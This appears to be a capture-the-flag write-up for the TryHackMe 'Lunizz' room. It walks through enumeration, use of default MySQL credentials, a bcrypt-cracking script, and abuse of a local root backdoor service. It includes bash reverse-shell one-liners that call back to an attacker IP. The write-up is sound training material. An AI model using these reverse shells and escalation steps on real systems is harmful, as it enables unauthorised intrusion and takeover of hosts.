# Lunizz

Available at: [TryHackMe](https://tryhackme.com/room/lunizzctfnd)
By: [kral4](https://tryhackme.com/p/kral4)
</br>
`export IP=10.10.120.161`

# Enum

Lets start with an nmap:
```bash
nmap -sC -sV -vv -oN nmap.txt $IP

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQ6tpIF+vVAr4XW2jvHXaX311/qtXWgA/XJsPs4e1sAEDV9x9qQb6d6YTUECsJVg7r/HLuK4U3Bn5tco9Aa4cfij07qlbby08K8ByOrCFHeOJreYVqjsCBMdOo29GC83hOH8IzCo99pONcuviuPtRXion4PURNZPkdiMjhJv0ugruICXvqvNuXCtb7o4cF+OGNx7vGzllSrBJoNW6dA3+bhwE+ktZ14Ezbycb4CzbGoKXC+SKqt+82VrwpC4F9B3JPsSs6dkutSW1Zs0mtBYynv4dXzi3/dyY89jNedHOzwlIsOOTPfMhDQ9Qu6LpixmbpTTKnAlW+6gVAo21pwWlZ
|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBTbAWLeWIuaAVyErImxGlw4qYC6DkIkhWx6m84sgWaNBG5dhXu96NpywKz3Qr/lq2y53WN0RufLUlmQGhJ2QMA=
|   256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRqrXXIaHRlVe9pndYgXYOQLkggzjJoC6ZToAWWHeUH
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   syn-ack ttl 63 MySQL 5.7.32-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.32-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, Support41Auth, SupportsTransactions, SupportsCompression, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, LongPassword, IgnoreSigpipes, ConnectWithDatabase, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: &wv\x16(x\x1Cz@%B8\x14z5pr{\x13\x0C
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.32_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.32_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-12-10T19:29:01
| Not valid after:  2030-12-08T19:29:01
| MD5:   1dd1 d145 b3aa d2c4 6652 764c 0cbd 3bbd
| SHA-1: 183a eca2 02d3 982a 72a1 15d6 973b 6eb1 5cae 6e6c
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMyX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIwMTIxMDE5MjkwMVoXDTMwMTIwODE5MjkwMVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zMl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3dOQjVEiheXhdhZwnHxq4
| 9+mEE3PH4Qu6d9vDYjX08ZzIPRRC4uk70KVmd7LAjtgLIeuw0uNHFZGJ0tyGH05M
| FgBsbNpwBfKTiCaCdv+45sMcFAktoesNkhWxDJZfXm+j02kAq8FmKSG01q2b/EVR
| 21xmiyfAkGzUF00yFq+evPY38zDANHuXDL7ar4SVhzNcUcIWNbymVPz7ShTj1AKz
| NN2//xdKOTxwnOYTFVDDBZ9S+MwJXVlSbREg5iant1CldktC5C7olpGsIsyBJXDO
| O4fO0LaA0NLqkgggE2kH5WUhOJVeatSLnESa7inmiN3gs3YLEuNZDm4Q9SCul33r
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAGpSusxJ
| qpmorCaIM+ILbP/e9P2eC/p5JbtZtT6kOhrHSLO5JMalq4r2SYCIcYdWc53KbE4O
| yvl9sFLsL7J0gOkrjXJquyjzcQEpC8EbrWiYgLHCCZUCR1ATwT/ZT4b1fZz2Og38
| BdNLMlRV5KRRTfvvTvNkax7wmrbUjrnnuYOc4JJpMR1HMGk3ZDpgn/GP0oBAsJuS
| S0bMSkdBXDGof4NDbvMBKNfhmld7BAOKn1vFSvwzsyLQvaLdJ6UExHNgsIb3BOMv
| AbkjXHlx2ciuMYTPG/T3gkf503ZCkXHfyiibqptuoKH6BbNp+omKHcKBFqx+b7NS
| SUxy89TgA5jAO44=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
4444/tcp open  krb524? syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     Can you decode this for me?
|     cEBzc3dvcmQ=
|     Wrong Password
|   NULL, SSLSessionReq: 
|     Can you decode this for me?
|_    cEBzc3dvcmQ=
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   NULL: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4444-TCP:V=7.91%I=7%D=2/25%Time=60382133%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncEBzc3dvcmQ=\n")%r(
SF:GetRequest,37,"Can\x20you\x20decode\x20this\x20for\x20me\?\ncEBzc3dvcmQ
SF:=\nWrong\x20Password")%r(SSLSessionReq,29,"Can\x20you\x20decode\x20this
SF:\x20for\x20me\?\ncEBzc3dvcmQ=\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.91%I=7%D=2/25%Time=6038212D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,46,"OpenSSH\x205\.1\nUnable\x20to\x20load\x20config\x20info\x20from\
SF:x20/usr/local/ssl/openssl\.cnf");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see we have a webeserver on port `80`, ssh on `22`, `4444` and `5000`

```bash
webctf http://$IP/

=============
COMMENTS
=============

[+] 1 :  
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  
[+] 2 :        <div class="table_of_contents floating_element">
        <div class="section_header section_header_grey">
          TABLE OF CONTENTS
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#about">About</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#changes">Changes</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#scope">Scope</a>
        </div>
        <div class="table_of_contents_item floating_element">
          <a href="#files">Config files</a>
        </div>
      </div>


=============
SCRIPTS
=============


=============
IMAGES
=============

sources:
--------
[+] 1 : /icons/ubuntu-logo.png

alts:
-----
[+] 1 : Ubuntu Logo

===================
INTERESTING HEADERS
===================

Server : Apache/2.4.29 (Ubuntu)
```
Nothing interesting in port `80`, just the default apache page. 

</br> On port `4444` we have a strange `Challenge - Response` service:
```
$ nc $IP 4444
Can you decode this for me?
cmFuZG9tcGFzc3dvcmQ=
randompassword
root@lunizz:# /bin/bash -i >& /dev/tcp/10.8.147.71/8888 0>&1
FATAL ERROR
```
Looks like a distraction mostly.</br>
When attempting to connect to port `5000` in the browser (and with `nc`) I got the following:
```
OpenSSH 5.1
Unable to load config info from /usr/local/ssl/openssl.cnf
```
Confirming the fingerprinting of nmap.

# Web

Time to bruteforce the directories:
```
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 30 -x txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.120.161/
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2021/02/25 17:48:54 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/hidden (Status: 301)
/instructions.txt (Status: 200)
/server-status (Status: 403)
/whatever (Status: 301)
```
`/whatever` and `/hidden` are interesting.<br> 
![whatever](whatever.png)</br>
![hidden](hidden.png)</br>
Cant really get anything to happen on `/whatever` and looks like `/hidden` doesnt actually upload. So I looked into `instructions.txt`:
```
cat instructions.txt 
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:*****************)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

# MySQL database

To connect remotely use `mysql -u runcheck -p -h $IP` and enter the password:
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 26
Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
So lets play around
```mysql
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| runornot           |
+--------------------+

```
Cool, lets check out the databases:
```
MySQL [(none)]> use runornot;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [runornot]> SHOW TABLES;
+--------------------+
| Tables_in_runornot |
+--------------------+
| runcheck           |
+--------------------+
MySQL [runornot]> SELECT * FROM runcheck;
+------+
| r**  |
+------+
|    0 |
+------+
```
Hey, lets change this value!
```
MySQL [runornot]> SELECT * FROM runcheck;
+------+
| r**  |
+------+
|    0 |
+------+
1 row in set (0.048 sec)

MySQL [runornot]> UPDATE runcheck SET run = 1
MySQL [runornot]> SELECT * FROM runcheck;
+------+
| r**  |
+------+
|    1 |
+------+
```
Now we can try `/whatever` again.</br>
![whatever-works](whatever-works.png)
</br> Alright, so we can run commands now. Can we get a reverse shell? Enter `/bin/bash -c "bash -i >& /dev/tcp/YOUR_THM_IP/8888 0>&1"` and run `nc -lvnp 8888` seperately. And bam! Reverse shell!

# User

First up we need a proper terminal:
```bash
www-data@lunizz:/var/www/html/whatever$ python3 -c "import pty;pty.spawn('/bin/bash')"
<ver$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@lunizz:/var/www/html/whatever$ export SHELL=/bin/bash;export TERM=xterm-256color 
<$ export SHELL=/bin/bash;export TERM=xterm-256color
www-data@lunizz:/var/www/html/whatever$ 

www-data@lunizz:/var/www/html/whatever$ ^Z     
[1]+  Stopped                 nc -lvnp 8888
root@kali:~/CTFs/TryHackMe/lunizzctf# stty raw -echo; fg
```
Very nice. Now lets look around.
```
www-data@lunizz:/$ ls -a
.   bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc   root  sbin  srv	    sys  usr  vmlinuz
..  boot  dev	 home  initrd.img.old  lib64  media	  opt  pro**  run   snap  swap.img  tmp  var  vmlinuz.old
```
I went to `/` as the hint said, and huh..... one folder really is off. It contains another folder called `pass` with a python bcrypt script that we can read. Happy reading it is.
```python
import bcrypt
import base64

password = # https://www.youtube.com/watch?v=-tJYN-eG1zk&ab_channel=QueenOfficial
bpass = password.encode('ascii')
passed= str(base64.b64encode(bpass))
hashAndSalt = bcrypt.hashpw(passed.encode(), bcrypt.gensalt())
print(hashAndSalt)

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
# I wrote this code last year and i didnt save password verify line... I need to find my password
```
So we have to watch the video. Lovely. </br>
Ah yes, rock you.... and a hash. What could that mean?

# Cracking the hash

This is a blowfish hash, so time to get crackin':
```
john --format=bcrypt --wordlist=rockyou.txt hash
```
And nothing, let me tell you in advance, this would take forever.

## Keygen

Since I believe the answer to be really way too far down `rockyou.txt` do the following: `sed -n '7288400,7288830p' /usr/share/wordlists/rockyou.txt > list.txt`. This will make a 430-ish long wordlist.</br>
Now just to create the keygeneration script. For this you can just rewrite the original:
```python
#!/usr/bin/env python3

import bcrypt
import base64


wordlist = []

with open('list.txt','rt') as file:
    f = file.readlines()
    wordlist = [ x.strip() for x in f ]

salt = b'$2b$12$SVInH5XmuS3C7eQkmqa6UO'
passwd = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'

for word in wordlist:
    password = word
    bpass = password.encode('utf-8')
    passed= str(base64.b64encode(bpass))

    hashAndSalt = bcrypt.hashpw(passed.encode(), salt)
    
    #print(hashAndSalt)
    
    if hashAndSalt == passwd:
        print(f'found: {word}')
        break
```
The salt can be figured out by actually using it the original variable `salt` which turns out to be the password. The salt is upto `6UO`, from there we just read lines, hash and compare.
```python
./key_gen.py 
found: ********
```
And after a bit of time the password is found.

# Lateral Privesc

From here I started looking around adam's home directory and found the following:
```
cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt 
do you remember our place 
i love there it's soo calming
i will make that lights my password--https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
``` 
And the place is the password for `mason`! From here we `su mason`.

# Horizontal Privesc

When I enumerate I run a few commands:</br>
```
id <- to see groups 
sudo -l <- do I have privs?
sudo -V <- CVE-2021-3156?
uname -a <- Kernel exploits?
find / -type f -name root or a user -perm /4000 2>/dev/null <- find suid binaries
cat /etc/crontab
netstat -a <- view active connections and running servers
```
And what do you know? `netstat -a` returns a service running on `http://127.0.0.1:8080`. Now normally you would setup port forwarding, but why? Just try curling it first!

```
curl http://127.0.0.1:8080/

**********************************************************
*      Mason's Root Backdoor       *
*              *
*   Please Send Request (with "password" and "cmdtype")  *
*              *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
Noice, we have Mason's password, so lets try a proof of concept:

```
mason@lunizz:/home/adam$ curl -X POST -F "password=**********" -F "cmdtype=lsla" http://127.0.0.1:8080/passwd
total 44
drwx------  6 root root 4096 Dec 10 19:58 .
drwxr-xr-x 25 root root 4096 Dec 14 04:53 ..
lrwxrwxrwx  1 root root    9 Dec 10 19:53 .bash_history -> /dev/null
-rw-r--r--  1 root root 3771 Dec 10 19:15 .bashrc
drwx------  3 root root 4096 Dec 10 20:13 .cache
drwx------  3 root root 4096 Dec 10 19:15 .gnupg
-rw-r--r--  1 root root  794 Dec  8 16:39 index.php
drwxr-xr-x  3 root root 4096 Dec 10 19:14 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   37 Dec  8 16:56 root.txt
-rw-r--r--  1 root root   66 Dec 10 19:35 .selected_editor
drwx------  2 root root 4096 Dec 10 19:09 .ssh
**********************************************************
* 		 Mason's Root Backdoor			 *
*							 *
*   Please Send Request (with "password" and "cmdtype")	 *
*							 *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
```
Awesome, so time to check out `passwd`
```
mason@lunizz:/home/adam$ curl -X POST -F "password=**********" -F "cmdtype=passwd" http://127.0.0.1:8080/passwd
<br>Password Changed To :**********<br>
**********************************************************
* 		 Mason's Root Backdoor			 *
*							 *
*   Please Send Request (with "password" and "cmdtype")	 *
*							 *
**********************************************************
-------------CMD TYPES-------------
lsla
reboot
passwd
mason@lunizz:/home/adam$ 
```
Wow, so the root password was just changed to mason's. And there we have it! Go get your flag.
